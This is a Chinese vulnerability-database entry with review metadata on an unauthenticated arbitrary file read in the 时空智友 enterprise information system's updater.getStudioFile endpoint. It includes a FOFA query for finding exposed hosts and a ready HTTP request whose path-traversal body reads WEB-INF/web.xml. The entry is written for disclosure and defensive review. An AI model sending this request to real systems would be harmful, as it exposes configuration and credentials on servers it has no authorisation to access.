---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "时空智友 updater.getStudioFile文件读取"
product: "时空智友"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本，Windows混合路径"
prerequisites: "声称未授权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20updater.getStudioFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"继续登录将挤掉原登录设备\""
fofa_unverified: "body="
id: "vw-83d29fd2c4c5eab9e2caf70a"
entity_id: "ve-83d29fd2c4c5eab9e2caf70a"
schema_version: "1"
---

# 时空智友 updater.getStudioFile文件读取

## 条目说明

- 对象与具体问题：时空智友；updater.getStudioFile文件读取
- 版本、配置及部署条件：无版本，Windows混合路径
- 认证与权限前提：声称未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type application/json但体是未引号原始路径，需说明接口实际文本读取
- FOFA截断，结果只图，缺根因/可读范围/修复
- 不要与用友时空KSOA混产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

时空智友企业信息管理系统 updater.getStudioFile 存在任意文件读取漏洞，未授权攻击者可读取敏感文件。

## 影响版本

时空智友企业信息管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA： body="继续登录将挤掉原登录设备"

POC/EXP：

```http
POST /formservice?service=updater.getStudioFile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json

..\..\WEB-INF/web.xml
```


![image-20250311133440952](./.resource/时空智友企业信息管理系统updater.getStudioFile任意文件读取漏洞/media/image-20250311133440952.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
